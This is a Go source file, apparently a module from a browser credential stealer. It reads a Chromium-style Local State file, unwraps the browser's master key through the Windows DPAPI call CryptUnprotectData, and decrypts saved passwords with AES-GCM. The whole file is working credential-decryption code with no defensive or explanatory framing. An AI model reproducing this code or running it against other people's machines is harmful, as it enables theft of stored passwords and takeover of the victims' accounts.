package decryption

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"errors"
	"os"
	"syscall"
	"unsafe"
)

// /////////////////////////// Custom DPAPI Implementation /////////////////////////////////
var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
	pdd         = dllcrypt32.NewProc("CryptUnprotectData")
	pll         = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func DecryptWithDPAPI(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := pdd.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer pll.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

//////////////////////////////////////////////////////////////////////////////////////////////

func GetMasterKey(path string) []byte {
	data, _ := os.ReadFile(path)

	var LocalStateJson struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	_ = json.Unmarshal(data, &LocalStateJson)

	EncryptedSecretKey, _ := base64.StdEncoding.DecodeString(LocalStateJson.OsCrypt.EncryptedKey)

	//check if we can even get the first 5 bytes and if we can't then just return nothing
	//not sure what is causing this to error out but it's better to just return nothing than to crash
	if len(EncryptedSecretKey) < 5 {
		return nil
	}

	secretKey := EncryptedSecretKey[5:]
	DecryptedSecretKey, _ := DecryptWithDPAPI(secretKey)

	return DecryptedSecretKey
}

func DecryptPassword(buff []byte, masterKey []byte) (string, error) {
	if len(buff) < 15 {
		return "", errors.New("invalid buffer length")
	}

	iv := buff[3:15]
	payload := buff[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	decryptedPass, err := gcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(decryptedPass), nil
}
